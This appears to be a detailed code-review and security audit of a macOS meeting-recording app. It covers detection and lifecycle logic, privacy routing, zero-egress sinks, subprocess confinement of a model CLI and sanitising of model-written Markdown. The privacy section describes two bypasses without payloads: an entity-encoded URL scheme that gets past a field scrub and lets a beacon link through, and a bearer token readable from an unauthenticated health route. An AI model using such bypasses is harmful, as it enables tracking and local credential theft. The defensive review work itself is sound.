The owner's DET17 decision is implemented: a browser sighted inside the resume window gets `presentPrompt`, past the cooldown its end armed, and never records without a click. But the branch burns `resumeCandidate` and logs `browser_resume_prompted` before the held and backoff guards, so a sighting those guards then drop still consumes the resume and logs a prompt that never showed. It also sets neither `pendingResumedFrom` nor `pendingResumeWorkflow`, so the browser half loses the `resumed_from` link and the previous half's workflow: a hand-picked NDA chip on the first half is not carried to the re-prompt (see findings, privacy). It supersedes END19 item 4's acceptance for browsers ("records without a prompt, or prompts with Record as its timeout action"): the browser timeout is now DET18's offer, which records nothing unless clicked.

#### END21 (`3715af9a`, `d179f6b6`): holds with gaps

For an adapter that publishes process audio, G001's mechanism is gone on the engine-end route: `TeardownHoldPolicy.trimPoint` returns `max(releasedAt, hold.startedAt)` when the mic reads released and nothing while it reads live, so a Leave-led hold opened at minute 31 and confirmed at minute 60 cuts at the release (`teams_native_lifecycle_end21_long_hold_cut_at_release`, and the replaced first-stamp pin in `TeardownHoldPolicyTests`, which the parent's rule fails). Every stop that passes through `stopRecording` with an open hold now concludes it under the `.stop` rule and logs `stop_route`, and the 30 s second-signal lead (`d179f6b6`) fixes the window-before-mic order the first commit left untrimmed. Gaps: for adapters without process audio (browsers, Webex, Slack) a pair or teardown end still cuts at the hold's first stamp, by the owner's item 2 decision, so G001 survives there; the END23 ceiling sets `pendingEndTrimAt` directly and bypasses this rule (documented in END23); and a hold concluded by an end the controller then ignores leaves its trim armed for the recording's later stop (finding M3). The evidence is a "latest" cache in `MeetingLifecycleCoordinator`, not a snapshot carried with the verdict; since the engine is terminal after `.ended` and a reset clears it to nil (which falls back to the hold's start for an `engineEnd`), a re-engage between the engine's `.ended` and the main-queue consumer would silently reintroduce the first-stamp cut. I found no route that re-engages there during a recording, so this is a robustness note, not a defect.

#### END23 (`3d0b8c5e`, `24d5fde6`): holds

`MicReleaseCeiling` is pure and matches the spec: both Teams families are in `meeting_apps.toml`, which is the production monitor's registry (`Coordinator.micHolder`), and a registered family with no process object reads released in the ledger (so classic Teams does not pin the ceiling on unknown), `unknown` pauses without clearing, `held` clears, credit per sample is capped at 2 s, and the cut is anchored on the wall clock when the release is first seen so a sleep cannot move it. The host stops through `stopRecording` whatever the engine reads, releases an open hold first and sets the cut directly, and the ceiling never arms a resume (`resumeCandidate` is written only on the lifecycle-end route), so it cannot loop. The owner-approved narrowing (`leftHeldAt >= recordingStartedAt`) leaves a resume onto an already-dead call unbounded, stated in the task. Tests drive the policy and the host tick directly with snapshots, so the 1 Hz timer wiring is unpinned beyond `armMicReleaseCeiling` being called at commit.

#### END28 (`121f56f9`): holds with gaps

The split mechanism is coherent: identity from the Leave element's own window, a split only on a different window and a different title held over two distinct AX reads at least 4 s apart, the stop routed through `stopRecording` (`stop_route: call_changed`), and the new call prompted from `resetAfterStop` past the cooldown its own stop armed, with `split_from` keyed to that prompt and dropped on every prompt exit. A Stop or toggle during the split's flush drops it. The gap is evidence, not code: the task states the field rows carry no Leave-window title, so beyond the compact panel (excluded by its `AXSystemDialog` subrole) the rule's behaviour against other windows that can hold a Leave control, such as the screen-share control bar, is untested. If one carries a title other than the meeting subject and the app name, a live call is split mid-call into a prompt whose timeout is an offer, so the rest of the call records only on a click (finding M5). The tick reads `lifecycleCoord.callWindow`, which is whatever adapter is engaged, not necessarily the recording's own (finding M2).

#### DET13 amendment (`b5391ab6`): holds

One line in `DetectionStateMachine.abandonPrompt` seeds the prompt's own source as the attachable candidate in the same call that arms the latch, so a hand start seconds after Skip, the close or a force stop attaches with its source instead of recording `manual`. The order (latch armed, then candidate) satisfies `liveSuppressedCandidate`'s latch gate, and the candidate goes with DET18's span. `AbandonedPromptCandidateTests` drives the real controller; the Skip and force-stop cases fail on the parent, the timeout case was already green through DET18's `offerPrompt`. A prompt withdrawn by an end seeds nothing, which matches DET14.

#### DET14 amendment (`f4745c89`): holds with gaps

`EndingReason.isDefinitive(forBundleID:)` is applied on both lifecycle-end routes (the `.recording` branch and `.endedDuringStart`), every other stop keeps END13's retention by default, and the Teams-only scope for `call_teardown_observed` correctly avoids G053's cross-app teardown. The gap is in the premise "neither of these has a call left to re-attach to": that is true of an app quit, but Teams' teardown line ends one call while the app stays up, and a normal Teams leave is usually teardown-confirmed (the task's own re-timed walkthrough says so). A back-to-back Teams call whose hand Record lands after the flush and before the first idle scan re-sights Teams now records `bundle_id: manual` with no end anchor, which is the shape END13 item 5 built this retention for; inside the 120 s resume window the resume branch also returns before the cooldown branch could re-seed it, so the press stays source-less until the native resume fires (finding L7). `StopCandidateRetentionTests` pins the menu-row half and not this one.

#### DET17 (`922a90f4`): holds with gaps

`MeetingTitlePatterns.googleMeetNamed` is anchored ("meet:" prefix, a letter or digit after it, document-app suffixes refused), sits in both the scanner's strong set and the adapter's live set, and is driven over a shape-class fixture with synthetic names; guard 1 (no browser recording without a click) holds on the timeout and auto-consent paths, and "Always" is not offered on a browser prompt. Guard 2 keys the hold on a hash of the last sighted tab title per browser, not on the tab whose `.starting` raised the prompt, so a prompt raised by tab B while the scanner last sighted tab A holds A (named as a known limit). The window-set gap END19 described remains: the scanner admits a Meet title from any AX window, the live signal reads only on-screen windows, so a scheduled Meet in a background window is engaged, never goes `.starting`, and gets no prompt (incident replay 2).

#### DET18 (`dde5319e`): holds with gaps

The four mechanisms are gone in code: the timeout's default branch calls `offerPrompt` (no cooldown, no latch, the prompt's own source held as the attachable candidate for the call's span); `SkippedMeetingLatch` is a per-bundle entry ended by the span (two positive mic-absent reads with no confident winner, or the app missing from the scan), not by a 60 s grace from the last winner; a weak end during `.prompting` keeps the panel and only a definitive end or a mic release withdraws it, with a one-poll backoff; hover and the chevron menu pause the acting timer, capped at 5 minutes. `prompt_dismissed` carries a reason on every exit. Gaps: an unanswered prompt still records nothing (the offer needs a click), so the 32-of-32 incident becomes recoverable rather than fixed; the span-end rule needs two scans between calls, which the mic edge's immediate scan plus a 3 s active poll usually provide for the field's 8 s gap but a sub-3 s back-to-back would still inherit the hold; and the chip pick is dropped at the timeout (finding M6). The acceptance tests feed `handleScanReadings` directly; production wiring was checked by reading: the watcher hands `spanReadings` to `onScanReadings` on main for every completed scan, winnerless ones included, before `onDiscovered`, and `Coordinator` forwards it to `handleScanReadings`.

#### DET19 (`98ed5f80`): holds with gaps

The report now judges each automatic stop against the recording bundle's own `process_audio_is_running_input` readings and a 10-minute same-bundle re-sighting window, scores foreign ends separately, and reports holds per route, overrun, trim error and fragments, all pure and fixture-driven. Two defects in the pairing: a foreign `lifecycle/ended` that the controller ignored (END11's `meeting_end_ignored_other_app`, now END19's `meeting_end_ignored_sourceless`) still sets `foreign_ended_ts`, and `classify_session` ranks `foreign_end` above force-stop and manual, so after END19 the 2026-11-11 shape (end ignored, recording stopped by hand later) is classified as an automatic `foreign_end` (finding M7); and the `recording_ended_during_start` branch is dead for current logs, because END20 (landed 19 minutes earlier) writes no `recording_started` for a never-committed start and `pair_sessions` opens only on `recording_started`, so those stops vanish from the report while the test fixture pins the old shape (finding L4). The re-sighting rule also scores a genuine end followed by the next meeting in the same app within 10 minutes as a false end, and an END28 split as a false end plus a fragment; that is the spec's chosen proxy, and DET23's ledger (landed after this commit) is the better span source now.

#### DET22 (`da3b5092`): holds

`passesOwnBar` lifts the old lone-candidate rule unchanged, contenders are filtered through it before branching, and a native blocks the trustworthy-browser exemption only with the calling-controls toolbar or by clearing the contested floor itself. The new tests assert outcomes (an idle title-only Teams no longer blanks a Zoom or Webex call; a stale Mute no longer blanks a Meet; a real native call still beats a Meet title; two sub-floor natives still return nil), and, traced through the parent's contested branch, the three behaviour-changing ones return nil there. The one re-pinned old test changed for the reason item 1 intends. Test bodies not read; the nil-on-parent judgement is traced from the parent's contested branch, not from the tests. A side effect worth knowing: with DET17's named shape now admitted, a code-less "Meet: <name>" tab wins any scan in which every native is below its own bar, including the blackout stretches of a live Teams call that is offered or held, which then engages Chrome (relevant to finding M2).

#### SEC39 (`11aebeae`): holds with gaps

The chip pick is keyed to its prompt's source, refused with no prompt up, and cleared with `override_discarded` on every prompt exit; a resume re-runs the matcher through `WorkflowMatcher.resumeWorkflow` and logs `workflow_source`. `test_theResumeRoutingTable` pins four rows and none of them is a stricter previous against a matched rule. Over the four combinations: no rule and a previous workflow keeps the previous; no rule and no previous takes the default; a rule match wins whatever the previous was; an NDA default over a non-NDA previous takes the NDA floor. The third case is a posture downgrade the spec chose: a call recorded under a hand-picked NDA workflow whose app also matches a non-NDA rule resumes, after a weak end END17 presumes false, under the non-NDA rule with lossless capture and the default sinks (finding M1). Two further gaps: the browser resume (`1f6fdfc0`, landed first) gets none of this routing, and `pendingResumeWorkflow` is cleared only inside `beginRecording` after its early returns, so a resume refused there leaves it armed for the next start of the same source (finding L3).

### Findings by severity

No finding below is high on its own. M1, M3 and M6 touch privacy routing or destroy audio under the NDA posture, so they are the ones to put to the owner first. M2 is the root M3 hangs on. Numbering keeps M4 empty: it was re-traced to a low (L7).

#### Medium

**M1. A resume downgrades a hand-picked NDA workflow to a non-NDA rule match (SEC39).**
`daemon/Sources/MeetingPipe/WorkflowMatcher.swift`, `WorkflowMatcher.resumeWorkflow`:
```swift
if case .matched = reason { return (matched, "rule") }
guard let previous else { return (matched, "default") }
if (matched?.flags.ndaMode ?? false) && !previous.flags.ndaMode { return (matched, "nda_floor") }
return (previous, "previous")
```
The NDA floor only ever raises the posture. Scenario: the owner records a Teams call and picks an NDA workflow on the chip because the call is confidential, while a rule maps `com.microsoft.teams2` to a non-NDA workflow. A weak end stops it and the same call is sighted inside 120 s, which END17 treats as "the end was probably wrong". The resume takes `.matched`, so the second half of the same call records under the non-NDA rule: lossless audio at rest, the rule's sinks, `workflow_source: rule`. The spec chose "if a rule matched, use it"; the case it did not weigh is a previous workflow that is stricter than the rule. A floor in both directions (never weaker than the previous when the previous is NDA) is one more line.

**M2. A sourced recording can run on another app's engine (pre-existing, now easier to reach).**
`daemon/Sources/MeetingPipe/MeetingSessionController.swift`, `engageLifecycleIfNeeded(source:handles:)`:
```swift
guard !coordinator.lifecycleCoord.isEngaged else {
    Log.event(category: "coordinator", action: "lifecycle_engage_skipped", attributes: [
        "bundle_id": source.bundleID,
        "reason": "already_engaged",
    ])
    return
}
```
and `MeetingLifecycleCoordinator.confirmRecording()`, which promotes whatever engine is `.starting` with no bundle check. Scenario: a Teams call is offered (DET18), its sighting held, and during a control blackout a "Meet: <name>" tab wins a scan (DET17 admits it, DET22 lets it win while Teams is below its bar), so discovery engages Chrome. The owner clicks "Record this Microsoft Teams meeting": `recordAttached` starts from `.idle`, a Chrome `.starting` during the bring-up is dropped by END20's `guard !startLatch.isInFlight`, the commit's `confirmRecording()` promotes Chrome's engine to `.inMeeting`, and the record-start build's engage is skipped as `already_engaged`. The Teams recording then has Chrome's engine: no Teams end detection (only END23's ceiling and the backstop), every Chrome end logged as `meeting_end_ignored_other_app`, a Chrome weak end showing "Confirming end" on the Teams HUD, and END28's tick reading Chrome's `callWindow` (nil, so no split). The two halves differ in reach: the Teams recording keeping Chrome's engine and so having no Teams end detection needs no timing at all, only an engage of another app at the moment of the click (`attachRecordStart` disengages nothing before `engageLifecycleIfNeeded`); the promotion of Chrome's engine to `.inMeeting`, and with it M3, needs the Chrome `.starting` to land inside the bring-up. Comparing the engaged bundle with the source before skipping would close both.

**M3. A hold concluded by an end the controller then ignores leaves its trim armed for the next stop.**
`MeetingSessionController.startConsumers`, `.ended` branch, and `resolveTeardownHold(for:)`:
```swift
case .ended(_, let reason):
    // END21: a lone-dwell end is no evidence of when the call ended (F032).
    concludeTeardownHold(
        conclusion: reason.confirmedBy.contains(PromotionEngine.loneDwellEvidence) ? .loneDwell : .engineEnd
    )
```
`resolveTeardownHold` runs before `handleMeetingEnded`, so `pendingEndTrimAt` is set even when `handleMeetingEnded` returns at `meeting_end_ignored_other_app`; the engine is then terminal, no later verdict reaches the `default:` branch that clears it, and `stopRecording` consumes it on whatever stop comes next. Scenario (reached through M2): the Teams recording on Chrome's engine sees a Chrome weak end held and pair-confirmed (no process audio, so the cut is the hold's first stamp); the end is ignored; 40 minutes later the owner presses Stop, `holdPolicy.isOpen` is false, and the stale cut is applied with `stop_route: toggle`. Under a lossless mode the transcript and summary drop those 40 minutes; under NDA or regulated capture `recorder.stop(limitSeconds:)` truncates them from disk. Clearing `pendingEndTrimAt` whenever an `.ended` leaves the recording running (the same place `lifecycle_recording_on_terminal_engine` is logged) closes it. Older than END21, but END21 made every route consume the cut.

**M5. END28 can split a live call on an unmeasured window (plausible, field data absent).**
`daemon/Sources/MeetingPipeCore/Lifecycle/CallIdentity.swift`, `CallIdentityTracker.observe`:
```swift
if read.windowID == current.windowID {
    clearPending()
    return .none
}
```
A split needs only a different window and a different title held over two reads 4 s apart. The compact call panel is excluded by its `AXSystemDialog` subrole (`callPanelSubrole`), which is the one window the code names; the task says the field rows carry no Leave-window title, so any other window the rescue re-walk can re-arm the Leave element in (the share control bar, a popped-out meeting window, a localized panel with another subrole) is unmeasured. If such a window carries neither the meeting subject nor the app's display name, a live call that shows it for more than 4 s is cut into a new stem and a split prompt whose timeout is always an offer, so the rest of the call records only on a click. `signal/call_identity_observed` now logs titles, window generation and subrole, so the first week of field data answers this; until then it is a risk, not a demonstrated defect.

**M6. A chip pick made on a prompt does not survive into its own offer (DET18 with SEC39).**
`MeetingSessionController.startPromptTimeout`, default branch:
```swift
self.notePromptDismissed(source, reason: .timedOutToOffer)
self.clearPromptRouting(exit: "timeout")
self.coordinator.prompt.dismiss()
```
The offer is the same call and the same source, but `clearPromptRouting` drops `pendingWorkflowOverride` and AI9's `preselectedRoutingHint`. Scenario: the owner opens the chip, picks an NDA workflow for a confidential call, moves the pointer away and is pulled into the call; 30 s later the panel collapses into the offer, and the "Record this <app> meeting" click goes through `recordAttached` and records under the rule match, not NDA. The row `override_discarded` with `exit: timeout` records it, and SEC39's progress note states the choice; the privacy cost was not weighed against it. Carrying the pick into the offer, keyed to the same source, keeps SEC39's guarantee (it cannot reach a different meeting).

**M7. `mp analyze-detection` classifies an ignored foreign end as the stop (DET19 with END19).**
`pipeline/src/mp/analyze_detection.py`, `pair_sessions` and `classify_session`:
```python
if ended_bundle and ended_bundle != open_session.bundle_id:
    open_session.foreign_ended_ts = ts
```
```python
elif session.foreign_ended_ts is not None:
    session.stop_kind = STOP_FOREIGN_END
```
Any foreign `lifecycle/ended` inside a session marks it, whether or not it stopped anything, and `foreign_end` outranks force-stop and manual. Since END19, the 2026-11-11 shape is "a Chrome end ignored (`meeting_end_ignored_sourceless`), the recording stopped by hand later", and the report counts it as an automatic foreign-end stop, not a manual stop. The same applies to every END11 `meeting_end_ignored_other_app`. Because END19's and END21's owner walkthroughs read this report to verify the fixes, the misclassification hides exactly what they are looking for. Reading the `meeting_end_ignored_*` rows, or requiring the end to fall within a second or two of `recording_stopped`, fixes it.

#### Low

**L1. END19's stale-engage bound tracks the last winner, not the engaged bundle.** `MeetingSessionController.handleDiscovery` calls `staleEngage.sighted(bundleID: source.bundleID, at: Date())` before the held, backoff and cooldown returns. A held Teams call that wins every scan keeps resetting the record while an engaged Chrome is never counted stale, and a winnerless run then disengages the engaged bundle under the other bundle's id in `lifecycle_disengaged_stale`. A background-window Meet tab that keeps winning is never bounded, contrary to the ship note's "bounded by item 1".

**L2. Stop during a prompt-origin bring-up runs both the cancel and the prompt branch.** In `forceStop`, `startLatch.cancel(by:)` is followed by `case .prompting(let src):` (the state still reads `.prompting` during a prompt-origin bring-up), which logs a second `prompt_dismissed` (`skipped`, after `beginRecording` logged `accepted`), arms a span-bound skip hold through `abandonPrompt` on the call the owner had just accepted, and goes idle while the recorder is still starting; the start then stops itself at commit. Nothing is lost, but DET18's field read-back sees two exits for one prompt, and the call the owner accepted is held off for its span.

**L3. `pendingResumeWorkflow` outlives a refused resume.** It is cleared only after `beginRecording`'s mic-permission and dry-run returns, and `clearPromptRouting` does not clear it. A native resume refused for a missing microphone permission leaves it armed, and the next start of an equal source (a later prompt's Record) records under the previous recording's workflow, ranked above AI9's pre-selection.

**L4. DET19's `recording_ended_during_start` branch is dead for current logs.** `pair_sessions` opens a session only on `recording_started`, which END20 no longer writes for a never-committed start, so those stops are dropped from the report; `test_mic_release_and_start_time_ends_are_not_manual_misses` builds the pre-END20 shape with a `recording_started` first.

**L5. The browser resume is consumed before the guards that can drop it (`1f6fdfc0`).**
```swift
if browserResume {
    resumeCandidate = nil
    Log.event(category: "coordinator", action: "browser_resume_prompted", attributes: [
```
It sits above `isPromptHeld` and `isInPromptBackoff`, so a held or backed-off sighting consumes the resume and logs a prompt that never showed. It also drops `resumed_from` for the browser half, so the Library's merge offer never appears for a browser false end.

**L6. A source-less start drops its own engine's end silently.** `RecordingStartLatch.noteEnd` returns `.ignored` for every end during a source-less bring-up, so an end of the engine the hand start is about to promote leaves it terminal; `engageLifecycleIfNeeded` returns at `guard let source = source` and never re-engages, and `noteRecordingOnTerminalEngine` is not reached because the state read `.idle` when the end arrived. The hand-started recording then has no lifecycle end and no row saying so.

**L7. DET14's definitive rule leaves a hand Record source-less until the resume fires (DET14 with END17).**
`daemon/Sources/MeetingPipeCore/Lifecycle/MeetingLifecycleVerdict.swift`, `EndingReason.isDefinitive(forBundleID:)`:
```swift
return NativeLifecycleConfig.teams.bundleIDs.contains(bundleID)
    && confirmedBy.contains(PromotionEngine.teardownEvidence)
```
Teams' teardown line ends one call, not the app, and a normal Teams leave is usually teardown-confirmed, so after it the stop retains no candidate. For the next 120 s a Teams sighting takes `handleDiscovery`'s resume branch (`engageLifecycle(for: source); return`), which sits above the cooldown branch that would re-seed the candidate, so nothing re-seeds it inside the window. Back-to-back call B is normally recorded by the silent native resume once its engine reaches `.starting`; but a hand Record pressed before that (call B still in the lobby, signals not yet live) finds no candidate and records `manual`: default workflow, no source, no chip, and an end anchor only if the commit happens to promote an engine already `.starting`. Before DET14 the stop-time retention covered exactly that press. Low, because the resume usually gets there first; keeping the retention for teardown ends and dropping it only on an app quit would keep DET14's menu fix for the quit case.

### Composite pass over the session controller

All of these run on main (`assertMainQueue` everywhere, verdicts hopped through `MainActor.run`), so the races are about ordering across awaits, not threads. The one await that matters is `beginRecording`'s bring-up (`audioRecorder.start` then PERF28's `writeRecoveryManifest`), during which the state machine still reads `.idle` or `.prompting`.

- **A prompt offer during a start in flight.** `handleMeetingStarted` returns at `guard !startLatch.isInFlight`, so no prompt is raised behind a start, and a prompt already up at commit is dismissed with `start_in_flight`. The cost is that the dropped `.starting` is not replayed: if it was another app's, that app's engine is then promoted by the commit's bundle-agnostic `confirmRecording()` (M2). A DET18 timeout cannot fire mid-start: `beginRecording` cancels the prompt timeout first.
- **Stop during Starting.** Toggle and `forceStop` both cancel the latch, `resolve()` is read with no suspension before `setRecording`, and a cancelled start is finalized through `stopRecording(committed: false)` with `activeWorkflow` already set, so its routing is right. From `.prompting` the Stop also abandons the prompt (L2). A start that throws clears the latch and drops the cancel, which is correct.
- **Resume plus workflow pick.** The native resume calls `clearPromptRouting(exit: "resume")`, so a chip pick from an earlier prompt cannot ride in, and the resume's routing goes through `pendingResumeWorkflow` keyed to the source. The browser resume has no routing of its own (L5, M1's privacy note applies to it too: a hand-picked NDA first half is followed by a re-prompt preselecting the rule).
- **A hand start while an offer is live.** `startManual` takes `liveSuppressedCandidate()`, which now includes the offer's source (DET18) and a skipped prompt's source (DET13), so it attaches with the source and arms end detection. It records under the rules, not the pick (M6). If discovery engaged another app meanwhile, M2 applies.
- **A stop while the capture file is created off main (PERF28).** The manifest write is awaited before `startLatch.resolve()`, and both Stop routes reach the latch while it is in flight, so a Stop during the write is honoured at commit; nothing commits a recording the owner stopped. `stopRecording` runs `cancelRecordStartBuild()`, so a record-start build landing after the stop cannot engage MicGate or the lifecycle.
- **Three timers per recording.** END23's ceiling tick, END28's identity tick and END9's hold timer are each guarded on `.recording(current == file)` or on the hold being open, and all three are disarmed at the top of `stopRecording`, so a tick after a stop or a split does nothing. END23 releases rather than concludes an open hold and writes the cut directly, which is the only stop route that bypasses END21's rule (stated in END23).
- **Flags with no reset site.** `lifecycleEngagedAt` is never cleared on disengage; it is harmless because a source-less recording cannot engage and END19 reads it only with `src == nil`. `pendingEndTrimAt` has no reset on an ignored end (M3). `pendingResumeWorkflow` has none on a refused resume (L3). `lastBrowserTabKey` grows per browser bundle only, so it is bounded.

### Incident replay

1. **An unanswered Teams prompt times out into Skip and the call goes unrecorded (32 of 32).** No longer a skip: the default branch calls `offerPrompt`, arming no cooldown and no latch, the menu bar reads "Detected Microsoft Teams" with a "Record this Microsoft Teams meeting" row, the banner carries the same click, and the offer lives for the call's mic span, so the next call in the same app prompts. But nothing records without a click under `default_prompt_action = "skip"`, so an owner who never sees the prompt still loses the call. Verdict: recoverable, not fixed. With `default_prompt_action = "record"` a native Teams timeout records (the browser stays at skip by DET17 guard 1). A chip pick made before the timeout is lost (M6).
2. **A Google Meet call in Chrome whose tab shows the meeting name and no room code gets no prompt.** Fixed for the selected tab of an on-screen window: the scanner admits "Meet: <name>" through `googleMeetNamed` with `titleMatch` true, DET22 lets it win unless a native clears the contested floor or shows the toolbar, discovery engages Chrome, `ShareableContentSignal` reads the on-screen title live, `.starting` reaches `handleMeetingStarted`, and a browser is never auto-consented, so `presentPrompt` runs. Still no prompt when the Meet tab sits in a background window (admitted by the scanner, never live on screen) or is not the selected tab; and the prompt's timeout is an offer, never a recording.
3. **A hand-started source-less recording ended mid-call by a stale browser engage.** Fixed for the 2026-11-11 shape: the Chrome engage predates `recordingCommittedAt` and never produced `.inMeeting` under the recording, so `meeting_end_ignored_sourceless` is logged and the recording keeps running. It would still stop if the hand start found that engine in `.starting` at commit (the commit promotes it and its end is then honoured, by the owner's rule), which needs a Chrome `.starting` that did not raise a prompt (held, backed off, cooling down, or dropped during the bring-up). `mp analyze-detection` will misreport the surviving recording's later hand stop as a foreign-end stop (M7).
4. **The held-end trim cutting from the first weak signal (G001).** Fixed for adapters that publish process audio: the cut is the mic release, and nothing is cut while the mic reads live, on the engine-end route and on every stop inside a hold. Still present by the owner's decision for browsers, Webex and Slack on a pair or teardown end (the hold's first stamp), and present in a new form through M3, where a foreign hold's first stamp is applied to the next stop of a recording it never ended.

## Area report: privacy and egress

Read-only review of the pinned worktree at `78b72306`. Nothing built or run except one stdlib regex check and `claude --help` (read-only) to confirm the SEC20 flags exist. Commit messages, comments and ship notes were treated as claims and checked against code. The audit findings were read through each task's Context and amendments, plus the cited entries themselves (G034, F167, F051, G037 in the independent audit; findings 1, 2, 3, 3b, 5, 7 and 8 in the security review's table); I did not re-derive each audit finding from scratch.

### Verdicts

**SEC18 (`aa00836b`), zero egress extended to files, BYO, backups: holds with gaps.** One sink rule now lives in `config.effective_sinks` (filesystem only under zero egress), `apply_overrides` calls it, Swift mirrors it in `RegulatedMode.effectiveSinks`, and `sink-rule-golden.json` is read by both `test_zero_egress_files.py` and `RegulatedModeTests`, so the no-sidecar and sidecar paths finally agree. The synced-target gate, `synced_target` reason in `publish.json`, BYO decline and backup refusal are all real and their tests would fail on the parent commit. Gaps: the backup gate fails open on an unreadable sidecar (finding M3), `workflow._fail_closed` still carries its own hard-coded `["filesystem"]` (L2), and on the default install the gate fails every zero-egress publish while the same summary uploads from the synced `raw/` library anyway (by design, warning only; the owner should know the gate protects the publish folder, not the meeting). BYO's acceptance "produces the on-device summary" is tested only as `_check_byo` returning None.

**SEC20 (`a9963b05`), `claude -p` confinement: holds.** `_command` passes `--tools ""`, an empty `--strict-mcp-config`, `--safe-mode`, `--disable-slash-commands`, `--no-session-persistence`; every flag exists in the installed CLI's `--help`, and `--safe-mode`'s help text matches the commit's claim (CLAUDE.md, hooks, plugins, MCP off; auth and model kept). Empty per-run temp cwd, all managed tokens stripped, and the armed refusal still fires before any spawn. The tests pin argv and env through summarize, `complete_text` (Ask and digest) and cleanup; they are argv restatements by nature, which is the right shape here. Only the owner's live run remains.

**SEC23 (`63f3d656`), tokens out of argv and the daemon env, typed Keychain reads: holds with known gaps.** `KeychainBackend.set` and `kc_set` both feed `security -i` on stdin with a printable-ASCII guard and `\`/`"` escaping; `printf` is a bash builtin so the value never reaches an exec argv. Reads are three-way on both sides, an unreadable account is never written or removed, both migrations keep `secrets.env` until every key lands, and `install.sh` now migrates `OPENAI_API_KEY`. `HF_TOKEN` still gets one launch `setenv` (documented, needed by the FluidAudio downloader); the only other `setenv` calls in `daemon/Sources` are `MP_VERBOSE` and a doc comment, and `SecretsEnvironmentFenceTests` greps for the token forms. The Swift migration body (`migrateEnvFileIfPresent`) does what the comment says: found skips, notFound sets, unreadable keeps the file. Known gaps are the ones the ship note owns: no distinct `keychain_unreadable` cause, and Python `load_secrets` still refills a token the daemon withheld outside zero egress, which makes the SEC5/SEC18 strip cosmetic there.

**SEC26 (`48ecae75`), held recordings out of the reaper's reach: holds.** `quarantine` now moves into `originals/held/`, the reaper filters `isRegularFile` and lists only the top level, the delete cascade trashes every `held-<n>` copy, retry answers a validation-prefixed `heldBack` error, and Show recording replaces Retry by reason prefix. The author's own note is correct that the two reaper tests pass against the old reaper too (a directory has no file size), so the reaper half is pinned by construction, not by a test. The unmigrated pre-change holds are a zero-impact gap: the task records that no `originals/` folder existed on the owner's Mac. In `MuteRedactor` I confirmed the `audio_unreadable` fail, the `restored` flag on a failed restore, the separate `unmeasured_spans` count and the checked `protectOriginalAtRest` returning failures with an `at_rest_protection_failed` event. Both `OrphanRecordingRecovery` callers now land in `held/`, including the stale-orphan Discard, so discarded intermediates are never reclaimed automatically either; that matches the "never a delete" comment there but means `held/` only grows (the task's "Explicitly not" already parks a cap).

**SEC27 (`ffe91c8e`), local model server shim: holds with gaps; the bearer leg of item 2 does not hold.** Items 1, 3 and 4 hold: serving passes a verified `snapshots/<sha>` directory offline, refuses `model_file`, `auto_map` and code files, a listener that cannot answer the HMAC health proof is refused in every mode, and the server child gets no managed token. The model pin in `Policy.check_load` (checked on the raw body and again in `ModelProvider.load`) closes the code-execution route. But the per-spawn bearer is obtainable from the unauthenticated `/health` route by any local client (finding M1), so "every request needs a bearer token" is false against exactly the threat class it was added for. The served-identity comparison correctly maps the snapshot path back to a repo id (`repo_id_from_snapshot`), so reuse does not thrash. Code read for these verdicts: `build_server_command` (shim under `sys.executable`, snapshot path, no token in argv), `_spawn` and `mp serve-local` (both resolve the snapshot, generate a fresh token, pass it only through `server_env`), `server_env` (starts from `child_env`, pops every managed key in every mode, forces offline), `_probe` (random nonce, HMAC check, bearer sent only after the proof), and `verify_snapshot`. No caller was silently broken: the only other HTTP caller is `scripts/valid1_check.py`, which switched its readiness check to `/health`, and the daemon's `LocalModelPreloader` makes no HTTP request.

**SEC28 (`9b41ed10`), Markdown sink scrub: holds with gaps.** `clean_text` is sound against the cases I tried (autolinks are removed as tags, `![` is always defanged so wiki embeds and reference images die too, entity-encoded `!` is not Markdown structure) and it runs as schema validators for title, summary, decisions, questions, task and extra sections, plus `apply_meeting_title`. But three model-written fields still reach the renderers without `clean_text`: `ActionItem.due` (no validator at all) and `owner` / `attendees`, which pass only `clean_person`, whose URL test is the literal `https?://|www\.` and is beaten by an entity-encoded scheme. So the exact beacon the task closes still works (finding M2). The spec's field list omitted these, and the task is closed as done.

**SEC30 (`b829ca8f`), URL policy: holds.** One `ExternalURLPolicy` with a model-text rule (http, https, mailto only; http(s) confirmed with the full address) and a publish-target rule (https for Notion, `obsidian://open`, `.md` files under a configured root after symlink resolution). Refused links are stripped to text in `SummaryMarkdown.inline` and `RichTextShare`, and two source fences pin that every model-text surface installs the action and every publish open site goes through the policy. The remaining `NSWorkspace.shared.open` calls I checked open app-built URLs (logs, settings panes, the `meetingpipe://` intents), not model or sidecar text. The only `AttributedString(markdown:)` parsers are `SummaryRenderedView` (filtered) and `GuideDocument` (bundled guide), with no `LocalizedStringKey(` or `Text(.init(` over model text, and the Notion `page_url` read in `MeetingDetailView.notion(at:)` reaches the system only through `openPublishTarget(url, sink: .notion)`.

**SEC32 (`7a16cb29`), kernel zero-egress spike: holds as a probe-first spike, with honesty gaps.** It builds nothing in production, pre-registers thresholds, prints the profile verbatim, separates the agent smoke from the owner verdict, and says plainly that the summary leg is unmeasured. The PASS and FAIL rows match the task file's table (as filed in `806661ff`) word for word. The added NOT PASS row was committed in the same commit as the smoke result, so history cannot show it was written first; it adds no lenient threshold, so this matters little. What it overstates is the reach of "10 of 10": every planted case is a direct connect from the confined tree to TEST-NET-1, and the "what a kernel deny cannot see" list omits delegated egress (finding L3, a hypothesis I did not test). The overhead leg is one run per arm in a fixed order, so it cannot resolve a 5% threshold, and the classifier is looser than the doc and the ship note ("blocked only on EPERM") say.

**SEC33 (`63570eaa`), Ask chips from visible meetings only: holds.** `Meeting.hasMetaSidecar` plus `isAskVisible` mirror `visibility.withheld_reason` (absent is withheld, unreadable is zero-egress, non-object JSON is unreadable on the Swift side), and chips, counts and the empty-answer copy all come from `AskPane.libraryFacts`. The only divergence I found is a literal `{}` sidecar, which Python withholds as `no_sidecar` and Swift shows; the daemon never writes one.

**SEC35 (`39511221`), doctor sync checks and backup picker warning: holds with gaps.** Published folder, backup destinations (marker and agent plist) and vault/LAN roots are checked with per-root severity, and the picker warns. Two interactions with SEC18, which landed two hours later and did not revisit this: doctor walks `lan.mount_path` with the ancestor `listxattr` walk SEC18 deliberately avoided for stale SMB mounts, and the vault/LAN FAIL rule under regulated mode is now stale since those sinks no longer receive regulated meetings (finding L1).

